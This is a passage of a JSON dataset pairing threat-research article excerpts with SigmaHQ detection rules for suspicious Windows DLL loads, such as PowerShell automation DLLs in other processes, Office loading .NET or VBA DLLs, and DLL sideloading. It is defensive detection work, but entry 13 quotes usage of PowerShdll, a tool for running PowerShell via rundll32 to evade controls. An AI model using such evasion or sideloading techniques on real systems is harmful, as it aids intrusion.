        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "filter_main_generic": {
          "Image|contains": [
            ":\\$WINDOWS.~BT\\",
            ":\\$WinREAgent\\",
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\",
            ":\\Windows\\explorer.exe",
            ":\\Windows\\SoftwareDistribution\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\",
            ":\\WUDownloadCache\\"
          ]
        },
        "filter_main_user_software_installations": {
          "Image|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-",
            ".tmp\\"
          ],
          "Image|endswith": ".tmp"
        },
        "filter_main_admin_software_installations": {
          "Image|contains": ":\\Windows\\Temp\\"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Other legitimate Windows processes not currently listed",
        "Processes related to software installation"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_uncommon_load.yml"
  },
  "12": {
    "url": "https://adsecurity.org/?p=2921",
    "markdown": "# PowerShell Security: PowerShell Attack Tools, Mitigation, & Detection *August 13, 2016* *Categories: Microsoft Security, PowerShell, Technical Reference* This post is a follow-up of sorts from my earlier posts on PowerShell, my PowerShell presentation at BSides Baltimore, and my presentation at DEF CON 24. Hopefully this post provides current information on PowerShell usage for both Blue and Red teams. **Related posts:** - BSides Charm Presentation Posted: PowerShell Security: Defending the Enterprise from the Latest Attack Platform - PowerShell Version 5 is Available for Download (again) - Detecting Offensive PowerShell Attack Tools - PowerShell Version 5 Security Enhancements ## The Evolution",
    "sigma_rule": {
      "title": "PowerShell Core DLL Loaded By Non PowerShell Process",
      "id": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
      "related": [
        {
          "id": "867613fb-fa60-4497-a017-a82df74a172c",
          "type": "obsolete"
        },
        {
          "id": "fe6e002f-f244-4278-9263-20e4b593827f",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreter's \"load powershell\" extension.\n",
      "references": [
        "https://adsecurity.org/?p=2921",
        "https://github.com/p3nt4/PowerShdll"
      ],
      "author": "Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2019-11-14",
      "modified": "2024-01-17",
      "tags": [
        "attack.t1059.001",
        "attack.execution"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Description": "System.Management.Automation"
          },
          {
            "OriginalFileName": "System.Management.Automation.dll"
          },
          {
            "ImageLoaded|endswith": [
              "\\System.Management.Automation.dll",
              "\\System.Management.Automation.ni.dll"
            ]
          }
        ],
        "filter_main_generic": {
          "Image|endswith": [
            ":\\Program Files\\PowerShell\\7\\pwsh.exe",
            ":\\Windows\\System32\\dsac.exe",
            ":\\WINDOWS\\System32\\RemoteFXvGPUDisablement.exe",
            ":\\Windows\\System32\\runscripthelper.exe",
            ":\\WINDOWS\\System32\\sdiagnhost.exe",
            ":\\Windows\\System32\\ServerManager.exe",
            ":\\Windows\\System32\\SyncAppvPublishingServer.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\System32\\winrshost.exe",
            ":\\Windows\\System32\\wsmprovhost.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\SysWOW64\\winrshost.exe",
            ":\\Windows\\SysWOW64\\wsmprovhost.exe"
          ]
        },
        "filter_main_dotnet": {
          "Image|contains": [
            ":\\Windows\\Microsoft.NET\\Framework\\",
            ":\\Windows\\Microsoft.NET\\Framework64\\"
          ],
          "Image|endswith": "\\mscorsvw.exe"
        },
        "filter_optional_sql_server_mgmt": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server Management Studio",
            ":\\Program Files\\Microsoft SQL Server Management Studio"
          ],
          "Image|endswith": "\\IDE\\Ssms.exe"
        },
        "filter_optional_sql_server_tools": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server\\",
            ":\\Program Files\\Microsoft SQL Server\\"
          ],
          "Image|endswith": "\\Tools\\Binn\\SQLPS.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": "\\Citrix\\ConfigSync\\ConfigSyncRun.exe"
        },
        "filter_optional_vs": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft Visual Studio\\",
            ":\\Program Files\\Microsoft Visual Studio\\"
          ]
        },
        "filter_optional_chocolatey": {
          "Image|contains": ":\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_nextron": {
          "Image|contains": ":\\Windows\\Temp\\asgard2-agent\\",
          "Image|endswith": [
            "\\thor64.exe",
            "\\thor.exe"
          ]
        },
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Used by some .NET binaries, minimal on user workstation.",
        "Used by Microsoft SQL Server Management Studio"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_system_management_automation_susp_load.yml"
  },
  "13": {
    "url": "https://github.com/p3nt4/PowerShdll",
    "markdown": "# PowerShdll Run PowerShell with dlls only. Does not require access to powershell.exe as it uses powershell automation dlls. PowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable. ## dll mode: ### Rundll32: ``` Usage: rundll32 PowerShdll,main <script> rundll32 PowerShdll,main -h Display this message rundll32 PowerShdll,main -f <path> Run the script passed as argument rundll32 PowerShdll,main -w Start an interactive console in a new window (Default) rundll32 PowerShdll,main -i Start an interactive console in this console If you do not have an interractive console, use -n to avoid crashes on output ``` ### Alternatives",
    "sigma_rule": {
      "title": "PowerShell Core DLL Loaded By Non PowerShell Process",
      "id": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
      "related": [
        {
          "id": "867613fb-fa60-4497-a017-a82df74a172c",
          "type": "obsolete"
        },
        {
          "id": "fe6e002f-f244-4278-9263-20e4b593827f",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreter's \"load powershell\" extension.\n",
      "references": [
        "https://adsecurity.org/?p=2921",
        "https://github.com/p3nt4/PowerShdll"
      ],
      "author": "Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2019-11-14",
      "modified": "2024-01-17",
      "tags": [
        "attack.t1059.001",
        "attack.execution"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Description": "System.Management.Automation"
          },
          {
            "OriginalFileName": "System.Management.Automation.dll"
          },
          {
            "ImageLoaded|endswith": [
              "\\System.Management.Automation.dll",
              "\\System.Management.Automation.ni.dll"
            ]
          }
        ],
        "filter_main_generic": {
          "Image|endswith": [
            ":\\Program Files\\PowerShell\\7\\pwsh.exe",
            ":\\Windows\\System32\\dsac.exe",
            ":\\WINDOWS\\System32\\RemoteFXvGPUDisablement.exe",
            ":\\Windows\\System32\\runscripthelper.exe",
            ":\\WINDOWS\\System32\\sdiagnhost.exe",
            ":\\Windows\\System32\\ServerManager.exe",
            ":\\Windows\\System32\\SyncAppvPublishingServer.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\System32\\winrshost.exe",
            ":\\Windows\\System32\\wsmprovhost.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\SysWOW64\\winrshost.exe",
            ":\\Windows\\SysWOW64\\wsmprovhost.exe"
          ]
        },
        "filter_main_dotnet": {
          "Image|contains": [
            ":\\Windows\\Microsoft.NET\\Framework\\",
            ":\\Windows\\Microsoft.NET\\Framework64\\"
          ],
          "Image|endswith": "\\mscorsvw.exe"
        },
        "filter_optional_sql_server_mgmt": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server Management Studio",
            ":\\Program Files\\Microsoft SQL Server Management Studio"
          ],
          "Image|endswith": "\\IDE\\Ssms.exe"
        },
        "filter_optional_sql_server_tools": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server\\",
            ":\\Program Files\\Microsoft SQL Server\\"
          ],
          "Image|endswith": "\\Tools\\Binn\\SQLPS.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": "\\Citrix\\ConfigSync\\ConfigSyncRun.exe"
        },
        "filter_optional_vs": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft Visual Studio\\",
            ":\\Program Files\\Microsoft Visual Studio\\"
          ]
        },
        "filter_optional_chocolatey": {
          "Image|contains": ":\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_nextron": {
          "Image|contains": ":\\Windows\\Temp\\asgard2-agent\\",
          "Image|endswith": [
            "\\thor64.exe",
            "\\thor.exe"
          ]
        },
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Used by some .NET binaries, minimal on user workstation.",
        "Used by Microsoft SQL Server Management Studio"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_system_management_automation_susp_load.yml"
  },
  "14": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "DotNET Assembly DLL Loaded Via Office Application",
      "id": "ff0f2b05-09db-4095-b96d-1b75ca24894a",
      "status": "test",
      "description": "Detects any assembly DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|startswith": "C:\\Windows\\assembly\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_assembly_dll_load.yml"
  },
  "15": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "CLR DLL Loaded Via Office Applications",
      "id": "d13c43f0-f66b-4279-8b2c-5912077c1780",
      "status": "test",
      "description": "Detects CLR DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\outlook.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|contains": "\\clr.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_clr_dll_load.yml"
  },
  "16": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "GAC DLL Loaded Via Office Applications",
      "id": "90217a70-13fc-48e4-b3db-0d836c5824ac",
      "status": "test",
      "description": "Detects any GAC DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-02-10",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|startswith": "C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate macro usage. Add the appropriate filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_gac_dll_load.yml"
  },
  "17": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "Active Directory Parsing DLL Loaded Via Office Application",
      "id": "a2a3b925-7bb0-433b-b508-db9003263cc4",
      "status": "test",
      "description": "Detects DSParse DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-28",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|contains": "\\dsparse.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dsparse_dll_load.yml"
  },
  "18": {
    "url": "https://www.mandiant.com/resources/blog/lnk-between-browsers",
    "markdown": "# A LNK Between Browsers: Hunting Methodologies and Extension Abusing Actors **May 1, 2023** --- Written by: Jared Wilson --- Two pillars in sleight of hand magic are *User Initiated Action*, where the target needs to believe their actions are their own, and *Hidden Action*, the trick needs to be concealed behind something ordinary and nonthreatening. Mandiant became aware of a chain of adversary methodologies that leverage these two pillars to achieve persistence. 1. The user executes an LNK shortcut file that, unbeknownst to them, has been tampered with. 2. The modified LNK shortcut file executes a legitimate browser, hiding",
    "sigma_rule": {
      "title": "Microsoft Excel Add-In Loaded From Uncommon Location",
      "id": "af4c4609-5755-42fe-8075-4effb49f5d44",
      "related": [
        {
          "id": "c5f4b5cb-4c25-4249-ba91-aa03626e3185",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Microsoft Excel loading an Add-In (.xll) file from an uncommon location",
      "references": [
        "https://www.mandiant.com/resources/blog/lnk-between-browsers",
        "https://wazuh.com/blog/detecting-xll-files-used-for-dropping-fin7-jssloader-with-wazuh/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-12",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\excel.exe",
          "ImageLoaded|contains": [
            "\\Desktop\\",
            "\\Downloads\\",
            "\\Perflogs\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "\\Windows\\Tasks\\"
          ],
          "ImageLoaded|endswith": ".xll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Some tuning might be required to allow or remove certain locations used by the rule if you consider them as safe locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_excel_xll_susp_load.yml"
  },
  "19": {
    "url": "https://wazuh.com/blog/detecting-xll-files-used-for-dropping-fin7-jssloader-with-wazuh/",
    "markdown": "# Detecting XLL files used for dropping FIN7 JSSLoader with Wazuh **May 24th 2022 | Wazuh 4.3** JSSLoader is a remote access trojan by the Russian FIN7 hacking group. There has been an increase in the number of JSSLoader infections this year. These infections have been utilizing Microsoft Excel add-in files (XLL files) to drop the JSSLoader trojan to victim machines. In this blog post, we use Wazuh to detect when an XLL file is used as a dropper for the JSSLoader trojan on a Windows endpoint. It is important to detect this dropper activity so we can respond to",
    "sigma_rule": {
      "title": "Microsoft Excel Add-In Loaded From Uncommon Location",
      "id": "af4c4609-5755-42fe-8075-4effb49f5d44",
      "related": [
        {
          "id": "c5f4b5cb-4c25-4249-ba91-aa03626e3185",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Microsoft Excel loading an Add-In (.xll) file from an uncommon location",
      "references": [
        "https://www.mandiant.com/resources/blog/lnk-between-browsers",
        "https://wazuh.com/blog/detecting-xll-files-used-for-dropping-fin7-jssloader-with-wazuh/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-12",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\excel.exe",
          "ImageLoaded|contains": [
            "\\Desktop\\",
            "\\Downloads\\",
            "\\Perflogs\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "\\Windows\\Tasks\\"
          ],
          "ImageLoaded|endswith": ".xll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Some tuning might be required to allow or remove certain locations used by the rule if you consider them as safe locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_excel_xll_susp_load.yml"
  },
  "20": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "Active Directory Kerberos DLL Loaded Via Office Application",
      "id": "7417e29e-c2e7-4cf6-a2e8-767228c64837",
      "status": "test",
      "description": "Detects Kerberos DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-28",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|endswith": "\\kerberos.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_kerberos_dll_load.yml"
  },
  "21": {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL While examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules. I don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts. ## What is an",
    "sigma_rule": {
      "title": "VBA DLL Loaded Via Office Application",
      "id": "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9",
      "status": "test",
      "description": "Detects VB DLL's loaded by an office application. Which could indicate the presence of VBA Macros.",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-02-10",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|endswith": [
            "\\VBE7.DLL",
            "\\VBEUI.DLL",
            "\\VBE7INTL.DLL"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate macro usage. Add the appropriate filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_vbadll_load.yml"
  },
  "22": {
    "url": "https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html",
    "markdown": "# Behind the Scenes: Unveiling the Hidden Workings of Earth Preta **Date:** June 14, 2023 --- ## Introduction In November 2022, we disclosed a large-scale phishing campaign initiated by the advanced persistent threat (APT) group Earth Preta, also known as Mustang Panda. The campaign targeted various countries around the Asia-Pacific (APAC) region via spear-phishing emails. Based on our previous research, government entities are one of the threat actor’s primary targets. Since the start of 2023, we’ve observed new arrival vectors being used by the group, such as MIROGO and QMAGENT. Furthermore, we discovered a new dropper named TONEDROP that drops",
    "sigma_rule": {
      "title": "Abusable DLL Potential Sideloading From Suspicious Location",
      "id": "799a5f48-0ac1-4e0f-9152-71d137d48c2a",
      "status": "test",
      "description": "Detects potential DLL sideloading of DLLs that are known to be abused from suspicious locations",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html",
        "https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-11",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_dll": {
          "ImageLoaded|endswith": [
            "\\coreclr.dll",
            "\\facesdk.dll",
            "\\HPCustPartUI.dll",
            "\\libcef.dll",
            "\\ZIPDLL.dll"
          ]
        },
        "selection_folders_1": {
          "ImageLoaded|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_folders_2": [
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Pictures\\"
            ]
          }
        ],
        "condition": "selection_dll and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_abused_dlls_susp_paths.yml"
  },
  "23": {
    "url": "https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/",
    "markdown": "# Beyond the Horizon: Traveling the World on Camaro Dragon’s USB Flash Drives **June 22, 2023** ## Executive summary - In early 2023, the Check Point Incident Response Team (CPIRT) team investigated a malware incident at a European healthcare institution involving a set of tools mentioned in the Avast report in late 2022. The incident was attributed to **Camaro Dragon**, a Chinese-based espionage threat actor whose activities overlap with activities tracked by different researchers as Mustang Panda and LuminousMoth, whose focus is primarily on Southeast Asian countries and their close peers. - The malware gained access to the healthcare institution",
    "sigma_rule": {
      "title": "Abusable DLL Potential Sideloading From Suspicious Location",
      "id": "799a5f48-0ac1-4e0f-9152-71d137d48c2a",
      "status": "test",
      "description": "Detects potential DLL sideloading of DLLs that are known to be abused from suspicious locations",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html",
        "https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-11",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_dll": {
          "ImageLoaded|endswith": [
            "\\coreclr.dll",
            "\\facesdk.dll",
            "\\HPCustPartUI.dll",
            "\\libcef.dll",
            "\\ZIPDLL.dll"
          ]
        },
        "selection_folders_1": {
          "ImageLoaded|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_folders_2": [
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          },
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\Pictures\\"
            ]
          }
        ],
        "condition": "selection_dll and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_abused_dlls_susp_paths.yml"
  },
  "24": {
    "url": "https://web.archive.org/web/20220519091349/https://fatrodzianko.com/2020/02/15/dll-side-loading-appverif-exe/",
    "markdown": "# DLL Side-loading Appverif.exe **Posted on:** February 15, 2020 **Categories:** lab, redteam, tutorial A couple of weeks ago, FireEye published a blog called “Abusing DLL Misconfigurations.” The gist of the blog post is that when an application is executed, it will try and load DLLs for whatever functionality it needs. If the Windows Side-by-side manifest for the application does not have the explicitly full path of the DLL, an attacker could try and get the application to load their malicious DLL instead. This can be done by creating your malicious DLL and placing it in the same directory the application",
    "sigma_rule": {
      "title": "Potential appverifUI.DLL Sideloading",
      "id": "ee6cea48-c5b6-4304-a332-10fc6446f484",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"appverifUI.dll\"",
      "references": [
        "https://web.archive.org/web/20220519091349/https://fatrodzianko.com/2020/02/15/dll-side-loading-appverif-exe/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-20",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\appverifUI.dll"
